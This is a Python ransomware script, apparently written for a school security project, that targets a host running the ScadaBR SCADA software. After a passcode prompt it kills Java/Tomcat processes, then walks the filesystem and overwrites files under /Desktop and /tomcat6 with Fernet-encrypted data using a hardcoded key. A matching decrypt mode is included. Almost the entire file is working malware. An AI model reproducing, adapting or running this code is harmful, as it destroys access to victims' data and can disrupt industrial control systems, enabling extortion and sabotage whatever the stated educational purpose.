from cryptography.fernet import Fernet
import cryptography
import os, sys, psutil, time, signal

#----- Startup -------------------------------------------------------------------------------------------------------------
def startup():

    # print starting messages
    print("\nRansomware created for school purposes only!");time.sleep(1.25)
    print("Used to encrypt the machine running ScadaBR for the \033[1;36mKEVIN\033[0;0m project.");time.sleep(1.25)

    # print out skulls image
    skulls()

    # safeguard passcode so you don't run by accident
    safeguard = input("\nEnter safeguard passcode: ")
    if(safeguard != "ransom"):
        print("\nwrong passcode");time.sleep(2)
        # terminates if passcode is wrong
        print("terminating script");time.sleep(2)
        exit()

    # menu to encrypt/decrypt/exit
    mode = " "
    while(1):
        if(mode == "e"):
            # shutdown tomcat server
            shutdown()
            # encrypt scadabr files
            encrypt()
            # exit script
            exit()

        elif(mode == "d"):
            # decrypt scadabr files
            decrypt()
            # exit script
            exit()

        elif(mode == "c"):
            print("\nterminating script");time.sleep(2)
            # exit script
            exit()

        else:
            # print menu on loop
            print("\nWould you like to...");time.sleep(0.3)
            print("[\033[2;36me\033[0;0m] Encrypt");time.sleep(0.3)
            print("[\033[2;36md\033[0;0m] Decrypt");time.sleep(0.3)
            print("[\033[2;36mc\033[0;0m] Exit");time.sleep(0.3)
            mode = input("\nSelection: ")

#----- Shutdown ------------------------------------------------------------------------------------------------------------
def shutdown():
    search_tomcat = ["\nsearching for tomcat6 server","searching for tomcat6 server.","searching for tomcat6 server..","searching for tomcat6 server..."]
    for i in range(0,4):
        print(search_tomcat[i], end='\r');time.sleep(0.5)

    # shutdown tomcat server running scada

    # tomcat server found?
    tomcat6_found = False

    # loop through running processes
    for proc in psutil.process_iter():
        try:
            # grab process name
            processName = proc.name()
            # grab process ID
            processID = proc.pid

            # if tomcat server then shutdown
            if "java" in processName or "catalina" in processName:

                try:
                    # call to shutdown ID of tomcat server
                    os.kill(processID, signal.SIGTERM)

                    # set boolean true to skip not found statement on line 90
                    tomcat6_found = True

                    print("\ntomcat6 server found!");time.sleep(1)
                    print("tomcat6 server \033[2;31mSHUTDOWN\033[0;0m :)");time.sleep(2)
                except:
                    pass

        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass

    if not tomcat6_found:
        print("\ntomcat6 server \033[2;31mNOT\033[0;0m running");time.sleep(2)

#----- Encrypt -------------------------------------------------------------------------------------------------------------
def encrypt():
    # key
    fernet = Fernet("2nHdfCA8E_byG16LWco2JtNCc7yIPdQPNx9EDavvWpg=")

    # list of directories to encrypt
    target_dir = ["/Desktop","/tomcat6"]

    search_encrypt = ["\nsearching for target directories","searching for target directories.","searching for target directories..","searching for target directories...","searching for target directories....","searching for target directories.....","searching for target directories......","searching for target directories.......","searching for target directories........","searching for target directories........."]
    for i in range(0,9):
        print(search_encrypt[i], end='\r');time.sleep(0.25)
    print("searching for target directories..........\033[2;31m[Complete]\033[0;0m");time.sleep(1)

    print("\033[5;31mENCRYPTING FILES\033[0;0m");time.sleep(3)

    # walk through all directories
    for root, dirs, files in os.walk("/", topdown=True):
        # walk through files
        for file in files:
            # don't encrypt myself, thanks
            if "Ransomware" not in root and "ransom.py" not in file:
                # checking for target directories
                for dir in target_dir:
                    if dir in root:
                        try:
                            # large files will cause script to be killed
                            if os.path.getsize(os.path.join(root,file)) < 26214400: # bytes
                                try:
                                    print("\033[2;31m[Encrypted]:\033[0;0m %s" % (os.path.join(root,file)))

                                    with open(os.path.join(root,file), "rb") as x:
                                        data = x.read()

                                    # store encrypted data
                                    data_encrypted = fernet.encrypt(data)

                                    # overwrite file with encrypted data
                                    with open(os.path.join(root,file), "wb") as x:
                                        x.write(data_encrypted)

                                    del data

                                except PermissionError:
                                    #print("PermissionError")
                                    pass
                                except OSError:
                                    #print("OSError")
                                    pass
                        except FileNotFoundError:
                            #print("FileNotFoundError")
                            pass

#----- Decrypt -------------------------------------------------------------------------------------------------------------
def decrypt():
    # key
    fernet = Fernet("2nHdfCA8E_byG16LWco2JtNCc7yIPdQPNx9EDavvWpg=")

    # list of directories to decrypt
    target_dir = ["/Desktop","/tomcat6"]

    search_decrypt = ["\nsearching for target directories","searching for target directories.","searching for target directories..","searching for target directories...","searching for target directories....","searching for target directories.....","searching for target directories......","searching for target directories.......","searching for target directories........","searching for target directories........."]
    for i in range(0,9):
        print(search_decrypt[i], end='\r');time.sleep(0.25)
    print("searching for target directories..........\033[2;31m[Complete]\033[0;0m");time.sleep(1)

    print("\033[5;31mDECRYPTING FILES\033[0;0m");time.sleep(3)

    # walk through all directories
    for root, dirs, files in os.walk("/", topdown=True):
        # walk through files
        for file in files:
            # shouldn't be encrypted
            if "Ransomware" not in root and "ransom.py" not in file:
                # checking for target directories
                for dir in target_dir:
                    if dir in root:
                        try:
                            # large files will cause script to be killed
                            if os.path.getsize(os.path.join(root,file)) < 26214400: # bytes
                                try:
                                    print("\033[2;31m[Decrypted]:\033[0;0m %s" % (os.path.join(root,file)))

                                    with open(os.path.join(root,file), "rb") as x:
                                        data = x.read()

                                    # store decrypted data
                                    data_decrypted = fernet.decrypt(data)

                                    # overwrite file with decrypted data
                                    with open(os.path.join(root,file), "wb") as x:
                                        x.write(data_decrypted)

                                    del data

                                except IsADirectoryError:
                                    #print("IsADirectoryError")
                                    pass

                                except PermissionError:
                                    #print("PermissionError")
                                    pass

                                except OSError:
                                    #print("OSError")
                                    pass

                                except (cryptography.fernet.InvalidToken, TypeError):
                                    #print("InvalidTokenError")
                                    pass

                        except FileNotFoundError:
                            #print("FileNotFoundError")
                            pass
def skulls():
    print("\n             uu$:$:$:$:$:$uu");time.sleep(0.05)
    print("          uu$$$$$$$$$$$$$$$$$uu");time.sleep(0.05)
    print("         u$$$$$$$$$$$$$$$$$$$$$u");time.sleep(0.05)
    print("         u$$$$$$$$$$$$$$$$$$$$$$$u");time.sleep(0.05)
    print("       u$$$$$$$$$$$$$$$$$$$$$$$$$u");time.sleep(0.05)
    print("       u$$$$$$$$$$$$$$$$$$$$$$$$$u");time.sleep(0.05)
    print("       u$$$$$$*   *$$$*   *$$$$$$u");time.sleep(0.05)
    print("       *$$$$*      u$u       $$$$*");time.sleep(0.05)
    print("        $$$u       u$u       u$$$");time.sleep(0.05)
    print("        $$$u      u$$$u      u$$$");time.sleep(0.05)
    print("         *$$$$uu$$$   $$$uu$$$$*");time.sleep(0.05)
    print("          *$$$$$$$*   *$$$$$$$*");time.sleep(0.05)
    print("            u$$$$$$$u$$$$$$$u");time.sleep(0.05)
    print("             u$*$*$*$*$*$*$u");time.sleep(0.05)
    print("  uuu        $$u$ $ $ $ $u$$       uuu");time.sleep(0.05)
    print(" u$$$$        $$u$u$u$u$u$$       u$$$$");time.sleep(0.05)
    print("  $$$$$uu      *$$$$$$$$$*     uu$$$$$$");time.sleep(0.05)
    print("u$$$$$$$$$$$      *****    uuuu$$$$$$$$$");time.sleep(0.05)
    print("$$$$***$$$$$$$$$$uuu   uu$$$$$$$$$***$$$*");time.sleep(0.05)
    print(" ***      **$$$$$$$$$$$uu **$***");time.sleep(0.05)
    print("          uuuu **$$$$$$$$$$uuu");time.sleep(0.05)
    print(" u$$$uuu$$$$$$$$$uu **$$$$$$$$$$$uuu$$$");time.sleep(0.05)
    print(" $$$$$$$$$$****           **$$$$$$$$$$$*");time.sleep(0.05)
    print("   *$$$$$*                      **$$$$**");time.sleep(0.05)
    print("     $$$*                         $$$$*");time.sleep(0.05)

#----- MAIN ----------------------------------------------------------------------------------------------------------------
startup()
